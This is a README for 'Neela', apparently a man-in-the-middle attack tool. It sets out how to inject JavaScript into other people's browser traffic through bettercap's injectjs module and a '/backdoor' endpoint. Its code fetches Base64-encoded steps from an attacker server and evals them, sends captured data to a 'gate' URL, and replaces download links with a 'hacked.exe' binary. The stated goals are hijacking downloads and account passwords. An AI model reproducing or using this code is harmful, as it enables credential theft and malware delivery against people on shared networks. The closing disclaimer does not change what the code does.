<p align="center">
<img  src ="https://s31.postimg.org/4s7r3ng0r/Neela_logo01_d.png" height="200" />
</p>
<br />


###### Resume:

Neela, MITM extension tools can execute a routine.

A routine is execution of multiple steps, for hijack download binary... hijack account password ... and more.

###### Require:
    - express
    - body-parser
    - colors
    - cookie-parser
    - cookie-session
    - dns
    - ent
    - express-session
    - ip
    - socket.io
    - os
    - request-ip

![Neela LAN](https://s31.postimg.org/40czeg3zv/home.png)

##### Start server

```javascript
node neela.js
```

![Neela](https://s31.postimg.org/46463yy8b/Capture_d_e_cran_2016_07_07_a_16_27_26.png)

##### Hacking with bettercap

```
--proxy-module injectjs --js-url "http://SERV_IP:3000/backdoor"
```

![bettercap with Neela](https://s32.postimg.org/duji0l405/Capture_d_e_cran_2016_07_07_a_16_25_50.png)

##### Make Routine & Hack !
* Create folder on /exploit/routine

Create info file

```javascript
{
  "name": "Name routine",
  "step":[
      {"name":"step1.neela"},
      {"name":"step2.neela"}
      ]
  ,
  "author": "Author"
}

```

* Create step file exemple:

step1.neela

  ```javascript
    alert('My first routine');
  ```

* set neela environement

```javascript
var serveur_neela = '10.34.2.139'; // Serv ip.
var step_neela = 0; // step 0=1 1=2 ...
var routine_name = 'Routine_folder_name';
```

* Update end function

```javascript
function end_neela(){

	console.log('ok end');
	var req = new XMLHttpRequest();
	req.open('GET', 'http://'+serveur_neela+':3000/next/'+step_neela+'/'+routine_name, true);
	req.onreadystatechange = function() {
    if (req.readyState == XMLHttpRequest.DONE) {
        eval(Base64.decode(req.responseText));
    }
}
	req.send(null);
}
```

* Get next step

```javascript
end_neela();
```

##### Gate receipt

```javascript
var req = new XMLHttpRequest();
req.open('GET', 'http://SERV_IP:3000/gate/'+encoded, false);
req.send(null);
```
![Neela](https://s31.postimg.org/wdfic47wr/Capture_d_e_cran_2016_07_07_a_15_32_28.png)

##### Replace download link
- Select replace_exe.neela routine
- Update /exploit/routine/exe/hacked.exe

![Neela replace](https://s31.postimg.org/worb3hngr/Capture_d_e_cran_2016_07_07_a_16_46_56.png)

##### Neela Logs

![Neela logs](https://s31.postimg.org/qgshncf17/logs.png)


reminder, infiltrate, monitor, computer system without authorization is a crime
